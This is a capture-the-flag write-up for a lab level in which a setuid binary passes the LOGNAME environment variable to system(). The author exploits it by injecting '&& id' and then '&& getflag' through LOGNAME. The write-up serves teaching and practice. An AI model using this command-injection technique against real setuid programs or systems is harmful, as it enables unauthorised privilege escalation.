# Level 07

## Initial Context

- A single file: `level07`

## Solving the Challenge

### Analyzing

```bash
$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

Executing `level07` seems to only display `level07`.

```bash
$ ./level07
level07
$ ./level07 hello
level07
$ ./level07 hello world
level07
```

Using `ltrace` to trace system calls, we can learn a little bit more. It seems that it print the `LOGNAME` environment variable.

```bash
$ ltrace ./level07
...
getenv("LOGNAME") = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff62, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07") = 0
...
```

Changing the value can confirm it:

```bash
$ LOGNAME=hello ltrace ./level07
...
getenv("LOGNAME") = "hello"
asprintf(0xbffff744, 0x8048688, 0xbffff917, 0xb7e5ee55, 0xb7fed280) = 16
system("/bin/echo hello") = 0
...
```

### Exploiting

If we can execute arbitrary command, we will be able to get the flag! Maybe bash's AND (`&&`) operator?

```bash
$ LOGNAME="hello && id" ltrace ./level07
getenv("LOGNAME") = "hello && id"
asprintf(0xbffff734, 0x8048688, 0xbffff911, 0xb7e5ee55, 0xb7fed280) = 22
system("/bin/echo hello && id") = 0
hello
uid=2007(level07) gid=2007(level07) groups=2007(level07),100(users)
```

Perfect! We should be able to get the flag:

```bash
$ LOGNAME="hello && getflag" ./level07
hello
Check flag.Here is your token : ....
```